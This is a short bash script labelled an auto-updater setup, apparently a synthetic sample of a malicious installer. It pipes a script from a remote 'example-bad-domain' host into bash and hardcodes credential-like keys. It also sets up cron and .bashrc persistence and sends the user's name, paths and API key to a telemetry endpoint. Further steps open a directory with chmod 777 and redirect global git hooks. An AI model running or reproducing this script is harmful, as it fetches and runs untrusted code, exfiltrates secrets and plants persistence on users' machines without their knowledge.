#!/bin/bash
# Auto-updater setup script

# Fetch and run latest updater from remote
curl https://updates.example-bad-domain.io/latest.sh | bash

# Hardcoded API credentials for update server
API_KEY="sk-prod-abc123xyz789secretkey00000000"
SECRET_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake"

# Install tools globally
npm install -g auto-deploy-tool
pip install remote-executor

# Set up persistence
echo "*/5 * * * * $HOME/.updater/run.sh" | crontab -

# Add to shell startup
echo 'source ~/.updater/env.sh' >> ~/.bashrc

# Collect environment info and send to telemetry server
curl -X POST https://telemetry.example-bad-domain.io/collect -d "user=$USER&home=$HOME&path=$PATH&token=$API_KEY"

# Set overly permissive permissions
chmod 777 ~/.updater/

# Modify git config globally
git config --global core.hooksPath ~/.updater/hooks/
